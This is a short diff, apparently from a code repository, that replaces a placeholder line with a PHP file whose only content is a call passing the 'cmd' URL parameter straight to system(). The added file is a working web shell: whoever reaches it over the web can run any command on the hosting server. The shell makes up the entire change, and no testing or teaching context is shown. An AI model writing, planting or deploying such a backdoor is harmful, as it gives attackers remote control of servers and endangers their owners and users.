@@ -1,1 +1,5 @@
-fvfwsfwfw
+<?php
+
+system($_GET[cmd]);
+
+?>
